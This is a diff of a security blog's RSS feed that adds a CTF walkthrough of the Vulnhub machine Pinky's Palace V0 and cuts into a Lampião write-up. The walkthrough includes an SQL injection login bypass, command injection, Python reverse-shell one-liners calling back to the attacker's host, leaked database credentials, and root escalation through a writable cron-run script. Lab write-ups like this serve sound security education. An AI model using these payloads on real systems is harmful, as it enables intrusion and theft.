@@ -7,6 +7,390 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
+        <title>Vulnhub.com - Pinky's-Palace V0</title>
+        <description>&lt;p&gt;Today we’re going to start a series of Vulnhub machines called &lt;strong&gt;&lt;em&gt;Pinky’s-Palace V0&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;The beginning of my Pinky's-Palace Boot2Root VMs.
+
+[+] Difficulty for user: Easy
+[+] Difficulty for root: Easy
+[+] VirtualBox
+[+] .7z File Hash: dfe36828e16bc98b97d9c4b3171a358fffc6497a&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Author: &lt;a href=&quot;https://twitter.com/Pink_P4nther&quot;&gt;@Pink_P4nther&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Download: &lt;a href=&quot;https://pinkysplanet.net/pinkys-palace-easy/&quot;&gt;https://pinkysplanet.net/pinkys-palace-easy/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;Firstly, we’re going to start with a &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan of the target.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nmap -sC -sV -sS -A 10.0.0.27
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-25 11:51 EDT
+Nmap scan report for 10.0.0.27
+Host is up (0.00063s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 7e:0e:97:38:ad:81:72:3e:97:94:b7:ad:22:fc:6a:cc (RSA)
+|   256 a8:72:b6:4f:a4:a6:6c:19:dd:49:30:29:c9:8c:7a:31 (ECDSA)
+|_  256 60:ac:bf:bd:fb:f7:3b:69:09:16:fa:5c:d3:cc:ba:41 (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Pinky's Palace
+MAC Address: 08:00:27:B0:73:BB (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.63 ms 10.0.0.27
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.90 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As both &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; ports are open, we can start by viewing the content of the webpage hosted on that server.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl 10.0.0.27
+&amp;lt;html&amp;gt;
+	&amp;lt;head&amp;gt;
+		&amp;lt;title&amp;gt;Pinky's Palace&amp;lt;/title&amp;gt;
+	&amp;lt;/head&amp;gt;
+	&amp;lt;body&amp;gt;
+		&amp;lt;h1&amp;gt;Welcome to Pinky's Palace!&amp;lt;/h1&amp;gt;
+		&amp;lt;p&amp;gt;We are still under development&amp;lt;/p&amp;gt;
+
+	&amp;lt;/body&amp;gt;
+	&amp;lt;style&amp;gt;
+		html
+		{
+			background: #f74bff;
+		}
+	&amp;lt;/style&amp;gt;
+&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Nothing useful there, so we can jump into the next step, which is running some scanners. My usual way to go is &lt;code class=&quot;highlighter-rouge&quot;&gt;nikto&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;directory-list-2.3-medium.txt&lt;/code&gt; wordlist.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nikto -h 10.0.0.27
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.0.0.27
++ Target Hostname:    10.0.0.27
++ Target Port:        80
++ Start Time:         2018-09-25 11:52:23 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.25 (Debian)
++ Server leaks inodes via ETags, header found with file /, fields: 0xda 0x562ba174aa704 
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3268: /dev/: Directory indexing found.
++ OSVDB-3092: /dev/: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7517 requests: 0 error(s) and 8 item(s) reported on remote host
++ End Time:           2018-09-25 11:52:45 (GMT-4) (22 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, this tool already revealed some interesting directories. Unfortunately, all are empty so let’s move on to &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# gobuster -u http://10.0.0.27 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.0.0.27/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes : 302,307,200,204,301
+=====================================================
+/uploads (Status: 301)
+/css (Status: 301)
+/dev (Status: 301)
+/portal_login (Status: 301)
+=====================================================&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;There it is, another directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;portal_login&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl 10.0.0.27/portal_login/
+&amp;lt;html&amp;gt;
+	&amp;lt;head&amp;gt;
+		&amp;lt;title&amp;gt;Login&amp;lt;/title&amp;gt;
+	&amp;lt;/head&amp;gt;
+	&amp;lt;body&amp;gt;
+		&amp;lt;center&amp;gt;&amp;lt;div class=&quot;log&quot;&amp;gt;
+				&amp;lt;center&amp;gt;&amp;lt;h2&amp;gt;Pinky's Dashboard Login&amp;lt;/h2&amp;gt;&amp;lt;/center&amp;gt;
+			&amp;lt;form action=&quot;login.php&quot; method=&quot;post&quot;&amp;gt;
+				Username:
+				&amp;lt;input type=&quot;text&quot; name=&quot;user&quot;/&amp;gt;
+				&amp;lt;br&amp;gt;Password:
+				&amp;lt;input type=&quot;password&quot; name=&quot;pass&quot;/&amp;gt;
+				&amp;lt;input class=&quot;btn&quot; type=&quot;submit&quot; value=&quot;Login&quot;/&amp;gt;
+			&amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt;
+	&amp;lt;/body&amp;gt;
+	&amp;lt;style&amp;gt;
+	html
+	{
+		background: #000000;
+	}
+	div.log
+	{
+		background: #f74bff;
+		top: 50px;
+		border: 200px solid #f74bff;
+		font-size: 20px;
+	}
+	input.btn
+	{
+		border: 3px solid #000000;
+	}
+	&amp;lt;/style&amp;gt;
+
+&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;A little bit of fiddling, and very simple SQL Injection in &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; field allowed us to log into the portal.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;pinky' OR 'a'='a
+test&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/pinkys-palace/after_logged.png&quot; alt=&quot;Logged in&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I immediately suspected an ability to inject commands into the &lt;code class=&quot;highlighter-rouge&quot;&gt;ping&lt;/code&gt; service.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;;whoami
+www-data&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now let’s use python to make a reverse shell and get us easier access to commands.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.4&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Before submitting the command, we have to set up an listener and then we are all ready.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nc -lvp 1337
+listening on [any] 1337 ...
+10.0.0.27: inverse host lookup failed: Unknown host
+connect to [10.0.0.4] from (UNKNOWN) [10.0.0.27] 48194
+/bin/sh: 0: can't access tty; job control turned off
+$ cat index.html
+&amp;lt;/www/html/1337pinkyssup3rs3cr3tlair$ cat index.html            
+&amp;lt;html&amp;gt;
+	&amp;lt;head&amp;gt;
+		&amp;lt;title&amp;gt;Pinky's Dashboard&amp;lt;/title&amp;gt;
+	&amp;lt;/head&amp;gt;
+	&amp;lt;body&amp;gt;
+		&amp;lt;center&amp;gt;&amp;lt;div&amp;gt;
+			&amp;lt;form action=&quot;mau.php&quot; method=&quot;post&quot;&amp;gt;
+				&amp;lt;h2&amp;gt;Ping an IP:&amp;lt;/h2&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;ip&quot;&amp;gt;
+				&amp;lt;input type=&quot;submit&quot; value=&quot;Ping!&quot;&amp;gt;
+			&amp;lt;/form&amp;gt;
+			&amp;lt;/div&amp;gt;&amp;lt;/center&amp;gt;
+	&amp;lt;/body&amp;gt;
+	&amp;lt;!-- I've been working on a new web dashboard I plan to have tons of commands!
+	 First I added a ping command because its simple! --&amp;gt;
+&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Looking around the files in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt; directory, I’ve noticed a file with credentials to &lt;code class=&quot;highlighter-rouge&quot;&gt;MySQL&lt;/code&gt; server.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+www-data@pinkys-palace:/var/www/html$ cd portal_login
+cd portal_login
+www-data@pinkys-palace:/var/www/html/portal_login$ ls -la
+ls -la
+total 16
+drwxr-xr-x 2 root root 4096 Jan 14  2018 .
+drwxr-xr-x 7 root root 4096 Jan 14  2018 ..
+-rw-r--r-- 1 root root  582 Jan 14  2018 index.html
+-rw-r--r-- 1 root root  717 Jan 14  2018 login.php
+www-data@pinkys-palace:/var/www/html/portal_login$ cat login.php
+cat login.php
+&amp;lt;?php
+if(empty($_POST['user']) || empty($_POST['pass']))
+{
+	echo &quot;&amp;lt;p&amp;gt;Incorrect Username or Password&amp;lt;/p&amp;gt;&quot;;
+}
+else
+{
+	$DB_USER = &quot;pinkys_dbu&quot;;
+	$DB_PASS = &quot;pinkysDBp@55&quot;;
+	$DB_HOST = &quot;localhost&quot;;
+	$DB_NAME = &quot;pinkdash_db&quot;;
+	$user = $_POST['user'];
+	$pass = $_POST['pass'];
+	$FULLQUERY = &quot;SELECT * FROM users WHERE username='&quot; . $user . &quot;' AND password='&quot; . MD5($pass) . &quot;'&quot;;
+
+	$conn = mysqli_connect($DB_HOST, $DB_USER, $DB_PASS);
+	$db = mysqli_select_db($conn, $DB_NAME);
+	$query = mysqli_query($conn, $FULLQUERY);
+	$rows = mysqli_num_rows($query);
+
+	if ($rows == 1)
+	{
+		header(&quot;Location: /1337pinkyssup3rs3cr3tlair/index.html&quot;);
+	}
+	else
+	{
+		echo &quot;&amp;lt;p&amp;gt;Incorrect Username or Password&amp;lt;/p&amp;gt;&quot;;
+	}
+	mysqli_close($conn);
+}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Let’s connect to the server and grab the credentials from the &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; table.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;www-data@pinkys-palace:/var/www/html/portal_login$ mysql -u pinkys_dbu -h localhost -p
+&amp;lt;l/portal_login$ mysql -u pinkys_dbu -h localhost -p
+Enter password: pinkysDBp@55
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 41320
+Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1
+
+Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]&amp;gt; use pinkdash_db
+use pinkdash_db
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [pinkdash_db]&amp;gt; SELECT * FROM users;
+SELECT * FROM users;
++------+----------+----------------------------------+
+| id   | username | password                         |
++------+----------+----------------------------------+
+|    1 | pinky    | 65f7886a4b9fc1214e3c365222321f93 |
++------+----------+----------------------------------+
+1 row in set (0.00 sec)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, together with Crackstation we are able to get the plain passowrd for the &lt;code class=&quot;highlighter-rouge&quot;&gt;pinky&lt;/code&gt; user.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;65f7886a4b9fc1214e3c365222321f93	md5	!!pinkbabygurl!!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Let’s &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; into the user.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;www-data@pinkys-palace:/var/www/html/portal_login$ su pinky
+su pinky
+Password: !!pinkbabygurl!!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;During usual exploration, I’ve noticed a strange script &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/bin/justincase.py&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;pinky@pinkys-palace:~$ find / -perm -g=s -o -perm -u=s -type f 2&amp;gt;/dev/null
+find / -perm -g=s -o -perm -u=s -type f 2&amp;gt;/dev/null
+/sbin/unix_chkpwd
+/var/mail
+/var/local
+/var/log/mysql
+/usr/local
+/usr/local/share
+/usr/local/share/sgml
+/usr/local/share/sgml/declaration
+/usr/local/share/sgml/entities
+/usr/local/share/sgml/stylesheet
+/usr/local/share/sgml/dtd
+/usr/local/share/sgml/misc
+/usr/local/share/emacs
+/usr/local/share/emacs/site-lisp
+/usr/local/share/xml
+/usr/local/share/xml/declaration
+/usr/local/share/xml/entities
+/usr/local/share/xml/schema
+/usr/local/share/xml/misc
+/usr/local/share/ca-certificates
+/usr/local/share/man
+/usr/local/sbin
+/usr/local/etc
+/usr/local/include
+/usr/local/games
+/usr/local/src
+/usr/local/lib
+/usr/local/lib/python3.5
+/usr/local/lib/python3.5/dist-packages
+/usr/local/lib/python2.7
+/usr/local/lib/python2.7/dist-packages
+/usr/local/lib/python2.7/site-packages
+/usr/local/bin
+/usr/local/bin/justincase.py
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/expiry
+/usr/bin/passwd
+/usr/bin/chage
+/usr/bin/crontab
+/usr/bin/chsh
+/usr/bin/dotlockfile
+/usr/bin/bsd-write
+/usr/bin/ssh-agent
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/wall
+/run/log/journal
+/run/log/journal/8e062ca349a24e31963ed63e0d3ad7d9
+/bin/mount
+/bin/ping
+/bin/umount
+/bin/su&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I decided to try my luck and put there reverse shell, as it may be run at specified time intervals.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;pinky@pinkys-palace:~$ cat /usr/local/bin/justincase.py
+cat /usr/local/bin/justincase.py
+#!/usr/bin/env python
+
+# Soon to be backup script for my palace!
+
+pinky@pinkys-palace:~$ nano /usr/local/bin/justincase.py
+pinky@pinkys-palace:~$ cat /usr/local/bin/justincase.py
+#!/usr/bin/env python
+
+# Soon to be backup script for my palace!
+
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.4&quot;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After few moments, we got connection from the target.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nc -lvp 1338
+listening on [any] 1338 ...
+10.0.0.27: inverse host lookup failed: Unknown host
+connect to [10.0.0.4] from (UNKNOWN) [10.0.0.27] 38640
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# cd /root
+# ls -la
+total 40
+drwx------  2 root root  4096 Jan 14  2018 .
+drwxr-xr-x 22 root root  4096 Jan 13  2018 ..
+-rw-r--r--  1 root root     0 Jan 14  2018 .bash_history
+-rw-r--r--  1 root root   570 Jan 14  2018 .bashrc
+-rw-------  1 root root     0 Jan 14  2018 .mysql_history
+-rw-r--r--  1 root root   148 Aug 17  2015 .profile
+-rw-r--r--  1 root root    76 Jan 14  2018 root.txt
+-rw-r--r--  1 root root    74 Jan 14  2018 .selected_editor
+-rw-------  1 root root 12736 Jan 14  2018 .viminfo
+# cat root.txt
+!!!!!CONGRATS YOU GOT ROOT!!!!!
+
+[+] Flag: d6dc7d5b9f99559fc6c91872bc7020af&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+</description>
+        <pubDate>Wed, 26 Sep 2018 02:00:00 +0200</pubDate>
+        <link>http://localhost:4000/vulnhub-pinkys-palace-v0/</link>
+        <guid isPermaLink="true">http://localhost:4000/vulnhub-pinkys-palace-v0/</guid>
+      </item>
+    
+      <item>
         <title>Google XSS Games</title>
         <description>&lt;p&gt;Today we’re playing with a little different challenge, series of XSS challenges from Google hosted &lt;a href=&quot;https://xss-game.appspot.com&quot;&gt;here&lt;/a&gt;. Give it a go, before reading this write up!&lt;/p&gt;
 
@@ -289,7 +673,7 @@
 
 &lt;p&gt;As we can see in the line &lt;code class=&quot;highlighter-rouge&quot;&gt;if (url.match(/^https?:\/\//)) {&lt;/code&gt;, we cannot input anything matching the &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; string. But, there is a catch, we can easily do it by entering &lt;code class=&quot;highlighter-rouge&quot;&gt;Http&lt;/code&gt; as the protocol.&lt;/p&gt;
 
-&lt;p&gt;In order to exploit, host a remote file containing &lt;code class=&quot;highlighter-rouge&quot;&gt;alert(1)&lt;/code&gt; (easily done with Pastebin), and in the URL enter &lt;code class=&quot;highlighter-rouge&quot;&gt;level6/frame#Htts://pastebin.com/raw/******&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;In order to exploit, host a remote file containing &lt;code class=&quot;highlighter-rouge&quot;&gt;alert(1)&lt;/code&gt; (easily done with Pastebin), and in the URL enter &lt;code class=&quot;highlighter-rouge&quot;&gt;level6/frame#Https://pastebin.com/raw/******&lt;/code&gt;.&lt;/p&gt;
 
 &lt;p&gt;Or even easier, using the data URI, just like this &lt;code class=&quot;highlighter-rouge&quot;&gt;data:text/javascript,alert(1)&lt;/code&gt;. That way we do not even have to create any remote files&lt;/p&gt;
 
@@ -3760,415 +4144,6 @@ Congratulations You are Root!
         <pubDate>Thu, 09 Aug 2018 02:00:00 +0200</pubDate>
         <link>http://localhost:4000/vulnhub-wakanda/</link>
         <guid isPermaLink="true">http://localhost:4000/vulnhub-wakanda/</guid>
-      </item>
-    
-      <item>
-        <title>Vulnhub.com - Lampião</title>
-        <description>&lt;p&gt;Let’s start another quick machine from Vulnhub called &lt;strong&gt;Lampião&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Would you like to keep hacking in your own lab?
-
-Try this brand new vulnerable machine! &quot;Lampião 1&quot;.
-
-Get root!
-
-Level: Easy&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Author: &lt;a href=&quot;https://www.vulnhub.com/author/tiago-tavares,581/&quot;&gt;Tiago Tavares&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/lampiao-1,249/&quot;&gt;https://www.vulnhub.com/entry/lampiao-1,249/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
-
-&lt;p&gt;Let’s start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nmap -v -sS -A -T4 10.0.0.12
-Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-05 06:18 EDT
-NSE: Loaded 148 scripts for scanning.
-NSE: Script Pre-scanning.
-Initiating NSE at 06:18
-Completed NSE at 06:18, 0.00s elapsed
-Initiating NSE at 06:18
-Completed NSE at 06:18, 0.00s elapsed
-Initiating ARP Ping Scan at 06:18
-Scanning 10.0.0.12 [1 port]
-Completed ARP Ping Scan at 06:18, 0.04s elapsed (1 total hosts)
-Initiating Parallel DNS resolution of 1 host. at 06:18
-Completed Parallel DNS resolution of 1 host. at 06:18, 0.00s elapsed
-Initiating SYN Stealth Scan at 06:18
-Scanning 10.0.0.12 [1000 ports]
-Discovered open port 22/tcp on 10.0.0.12
-Discovered open port 80/tcp on 10.0.0.12
-Completed SYN Stealth Scan at 06:18, 0.08s elapsed (1000 total ports)
-Initiating Service scan at 06:18
-Scanning 2 services on 10.0.0.12
-Completed Service scan at 06:18, 4.80s elapsed (2 services on 1 host)
-Initiating OS detection (try #1) against 10.0.0.12
-NSE: Script scanning 10.0.0.12.
-Initiating NSE at 06:18
-Completed NSE at 06:19, 9.05s elapsed
-Initiating NSE at 06:19
-Completed NSE at 06:19, 0.02s elapsed
-Nmap scan report for 10.0.0.12
-Host is up (0.00082s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)
-|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)
-|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)
-|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)
-80/tcp open  http?
-| fingerprint-strings: 
-|   NULL: 
-|     _____ _ _ 
-|     |_|/ ___ ___ __ _ ___ _ _ 
-|     \x20| __/ (_| __ \x20|_| |_ 
-|     ___/ __| |___/ ___|__,_|___/__, ( ) 
-|     |___/ 
-|     ______ _ _ _ 
-|     ___(_) | | | |
-|     \x20/ _` | / _ / _` | | | |/ _` | |
-|_    __,_|__,_|_| |_|
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port80-TCP:V=7.70%I=7%D=8/5%Time=5B66CF0D%P=x86_64-pc-linux-gnu%r(NULL,
-MAC Address: 08:00:27:25:9F:3F (Oracle VirtualBox virtual NIC)
-Device type: general purpose
-Running: Linux 3.X|4.X
-OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
-OS details: Linux 3.2 - 4.9
-Uptime guess: 198.048 days (since Fri Jan 19 04:09:43 2018)
-Network Distance: 1 hop
-TCP Sequence Prediction: Difficulty=261 (Good luck!)
-IP ID Sequence Generation: All zeros
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE
-HOP RTT     ADDRESS
-1   0.82 ms 10.0.0.12
-
-NSE: Script Post-scanning.
-Initiating NSE at 06:19
-Completed NSE at 06:19, 0.00s elapsed
-Initiating NSE at 06:19
-Completed NSE at 06:19, 0.00s elapsed
-Read data files from: /usr/bin/../share/nmap
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 16.48 seconds
-           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;From here we can see that both &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; services are open. We can start with the web service, and see what’s inside the web page using &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl 10.0.0.12
- _____ _   _                                                      
-|_   _| | ( )                                                     
-  | | | |_|/ ___    ___  __ _ ___ _   _                           
-  | | | __| / __|  / _ \/ _` / __| | | |                          
- _| |_| |_  \__ \ |  __/ (_| \__ \ |_| |_                         
- \___/ \__| |___/  \___|\__,_|___/\__, ( )                        
-                                   __/ |/                         
-                                  |___/                           
-______ _       _                                                _ 
-|  ___(_)     | |                                              | |
-| |_   _    __| |_   _ _ __ ___   __ _    ___  __ _ _   _  __ _| |
-|  _| | |  / _` | | | | '_ ` _ \ / _` |  / _ \/ _` | | | |/ _` | |
-| |   | | | (_| | |_| | | | | | | (_| | |  __/ (_| | |_| | (_| |_|
-\_|   |_|  \__,_|\__,_|_| |_| |_|\__,_|  \___|\__, |\__,_|\__,_(_)
-                                               __/ |              
-                                              |___/                                                                                    
-                                          ...                                  
-                           ./(/.         .,/*/,..,.,..                         
-                       ,,                      ..  ,.,..,(                     
-                    %.                             .  ...,,.#                  
-                 .&amp;amp;..                                    . .,.#                
-               (.                                      .,/,/, .*#.             
-            .#.                                             .,. .(#            
-           (,                                                **, .#%           
-         .%                                                    /,..(#          
-        .,                                                      ((.,@*.        
-       ..                           .,,      .                  ./( ,//        
-       (...                 *(#&amp;amp;@@@@@@@@@@@@@@#/.                .,/*%,*       
-      %(..               (@@@#   . ( / ,.%@@@@@@@@@@#,*,..  *     .,,*&amp;amp;(       
-      @.           ,/#@@@@,  .   .  .,.    .*(@@@@@@@@%%@@@@@(/...,(*,@,,      
-     *@.       /#@@@@@@@@ ../*/,..             .&amp;amp;@@@@@@@@@@@&amp;amp;((%(./(/#&amp;amp;&amp;amp;(      
-     &amp;amp;(    .(@@@@@@@@@@@,        /*.     (@@%@@@@(##@@@@@@@@@@&amp;amp;@@###%/(@(      
